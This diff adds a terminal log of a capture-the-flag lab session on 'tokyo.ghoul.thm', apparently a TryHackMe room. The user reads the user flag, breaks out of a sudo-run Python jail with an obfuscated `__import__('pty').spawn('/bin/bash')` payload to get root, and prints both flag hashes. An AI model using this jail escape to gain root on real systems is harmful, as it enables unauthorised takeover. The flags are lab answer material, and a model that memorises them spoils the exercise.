@@ -1,0 +1,60 @@
+Script started on 2026-09-19 16:07:14+03:00 [COMMAND="ssh kamishiro@tokyo.ghoul.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+The authenticity of host 'tokyo.ghoul.thm (10.82.151.221)' can't be established.
+ED25519 key fingerprint is: SHA256:oo//h4aM0BBJSlV7s7eejBvC/3yzDDk/PL7KIK6mewQ
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'tokyo.ghoul.thm' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+kamishiro@tokyo.ghoul.thm's password: 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+This system is built by the Bento project by Chef Software
+More information can be found at https://github.com/chef/bento
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Sat Jan 23 22:29:38 2021 from 192.168.77.1
+kamishiro@vagrant:~$ ls
+jail.py  user.txt
+kamishiro@vagrant:~$ cat user.txtr
+cat: user.txtr: No such file or directory
+kamishiro@vagrant:~$ cat user.txt
+e6215e25c0783eb4279693d9f073594a
+kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py
+[sudo] password for kamishiro: 
+Hi! Welcome to my world kaneki
+========================================================================
+What ? You gonna stand like a chicken ? fight me Kaneki
+>>> __builtins__.__dict__['__im' + 'port__']('pty').spawn("/bin/bash")
+root@vagrant:~# cd
+root@vagrant:~# cd /root
+root@vagrant:/root# cat root.txt
+9d790bb87898ca66f724ab05a9e6000b
+root@vagrant:/root# sudo [K[K[K[K[Kexit
+exit
+No Kaneki you are so dead
+kamishiro@vagrant:~$ exit
+logout
+Connection to tokyo.ghoul.thm closed.
+
+Script done on 2026-09-19 16:10:11+03:00 [COMMAND_EXIT_CODE="0"]
